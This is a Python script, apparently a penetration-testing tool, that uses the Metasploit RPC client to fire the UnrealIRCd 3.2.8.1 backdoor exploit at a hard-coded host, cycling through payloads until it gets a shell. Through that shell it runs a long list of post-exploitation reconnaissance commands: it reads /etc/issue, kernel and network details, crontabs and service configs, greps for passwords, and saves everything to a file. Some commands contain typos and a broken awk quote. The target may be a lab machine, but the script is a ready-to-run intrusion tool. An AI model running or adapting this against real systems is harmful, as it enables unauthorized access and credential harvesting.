import os
import signal
from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
import time
from netaddr import IPNetwork, IPAddress
import re
from sys import argv

argv.append('')

def handler(signum, frame):
    raise Exception("timed out")

def recon(cmdlist):
    if len(shell.read()):
        print "Restart msfrpcd to clear initial buffer"
        exit()
    signal.signal(signal.SIGALRM, handler)
    txt = open("recon.txt", "w")
    for cmd in cmdlist:
        if 'banner' in cmd:
            txt.write('\n' + ('~'*80) + '\n')
            title = cmd[7:]
            space = '='* (40 - int(round(len(title)/2)))
            txt.write(space + title + space)
            txt.write('\n' + ('~'*80) + '\n')
        else:
            if argv[1] == '-c':
                txt.write(cmd+'\n')
            try:
                signal.alarm(5)
                shell.write(cmd+'\n')
                buffer = ""
                temp = shell.read()

                while(len(temp)):
                    buffer = buffer + temp
                    temp = shell.read()
                    time.sleep(.001)

                txt.write(buffer)
                txt.flush()
            except:
                pass

client = MsfRpcClient('password', port=55553)
time.sleep(10)
exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
exploit['RHOST'] = '192.168.1.230'
#exploit['RPORT'] = '8067'

for pl in exploit.payloads:
    exploit.execute(payload=pl)
    time.sleep(10)
    X = client.jobs.list
    print(X)
    if len(X):
        if X.keys()[0] != 'None':
            break
    pass
while len(client.sessions.list) == 0:
    print client.sessions.list
    time.sleep (5)
shell = client.sessions.session(client.sessions.list.keys()[0])

cmdlist = ['ls','banner Distro','cat /etc/issue','cat /etc/*-release','cat /proc/version', 'uname -a', 'uname -mrs','rpm -q kernel','dmesg | grep Linux',
'ls /boot | grep vmlinuz-','banner EnvVars', 'cat /etc/profile', 'cat /etc/bashrc', 'cat ~/.bash_profile', 'cat ~/.bashrc', 'cat ~/.bash_logout', 'env', 'set'
,'banner Printers', 'lpstat -a','banner Services Running', 'ps aux', 'ps -ef', 'top', 'cat /etc/services','banner Root Serivces Running', 'ps aux | grep root', 'ps -ef | grep root',
'banner Apps Installed', 'ls -alh /usr/bin/', 'ls -alh /sbin', 'dpkg -l', 'rpm -qa', 'ls -alh /var/cache/apt/archies0', 'las -alh /var/cache/yum/', 'banner Service Settings','cat /etc/syslog.conf',
'cat /etc/chttp.conf', 'cat /etc/lighttpd.conf', 'cat /etc/cups/cupsd.conf', 'cat /etc/inetd.conf', 'cat /etc/my.conf', 'cat /etc/my.conf', 'cat /etc/httpd/conf/httpd.conf', 'cat /opt/lampp/etc/httpd.conf', "ls -aRl /etc/ | awk '$1 ~ /^.*r.*/",
'banner Scheduled Jobs', 'crontab -l', 'ls -alh /var/spool/cron', 'ls -al /etc/ | grep cron', 'ls -al /etc/cron*', 'cat /etc/cron*', 'cat /etc/at.allow', 'cat /etc/at.deny', 'cat /etc/cron.allow', 'cat /etc/cron.deny', 'cat /etc/crontab',
'cat /etc/anacrontab', 'cat /var/spool/cron/crontabs/root', 'banner Usernames/Passwords', 'grep -i user [filename]', 'grep -i pass [filename]','grep -C 5 "password" [filename]', 'find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"',
'banner NIC', '/sbin/ifconfig -a', 'cat /etc/network/interfaces', 'cat /etc/sysconfig/network','banner Network Config', 'cat /etc/resolv.conf', 'cat /etc/sysconfig/network', 'cat /etc/networks', 'iptables -L', 'hostname', 'dnsdomainname',
'banner Users/Hosts On System', 'lsof -i', 'lsof -i :80', 'grep 80 /etc/services', 'netstat -antup', 'netstat -antpx', 'netstat -tulpn', 'chkconfig --list', 'chkconfig --list | grep 3:on', 'last', 'w' ]
recon(cmdlist)
